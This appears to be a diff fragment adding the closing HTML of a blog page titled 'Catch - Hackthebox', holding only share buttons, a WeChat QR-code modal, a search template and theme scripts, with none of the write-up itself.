+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Catch - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/04/06/Hackthebox%20-%20Catch/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/04/06/Hackthebox%20-%20Catch/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACKElEQVR42u3aQW7jMAwF0N7/0ul2gKmST9ItYPppZTipracCjEjq6yser3/G6dP/r/M7yVsuGBgYGLdlvN6O00Tff7+3BKN3YWBgPICRhNHTIxJAdbr53DAwMDBOQTPfDp4+zXkYGBgYvdT0/eZvEoIxMDAwJklsnrImd3pbxgtycQwMjBsy8qr731//Sn8DAwPjVoxXa1TL+tc2A36YDwYGxmpGNQjOeT1AlOJiYGAsZfRenxTFkr/KWw6FUIuBgfEARjU4zhPdfJmiXwwMDIyljN5r5hvBXmnvuDXEwMBYyqiG2jyV7ZXh8mMcH56AgYGxiDGfXK/9mQT6chKLgYGxlNELuPkBr97U8ydgYGA8hzHqf8Z3JssR4TEwMB7GmATiqwpz5UMeGBgYSxmTgw69jeD86MaH/wMGBsY6RjXw5XcSQN7avKB5iYGBcVtG8tA8dPbWr7rpPP5uYGBgLGXkAbdXh/+9wxbH52BgYKxj9BLIfCp5AlxNicvRHQMD47aMavjrBeLe/fJsMTAwljKqRa75YYtJIe9IxcDAWM3IN3+9str8sEVeBMTAwNjKeBXHvGE5D68fKoUYGBjrGL3UtNcYqLY/82sMDIwnMJIgmzN6zYNewP2ww8XAwFjHyANfvjXMk9VJeQ4DAwOjN4lqgM7fVW5kYmBgPIyRNzjnx7yaJ3AxMDBWM65KYvOFuKrkh4GB8QRGNXWsJrS9clu+WBgYGKsZ3/D5b4VXb0qPAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
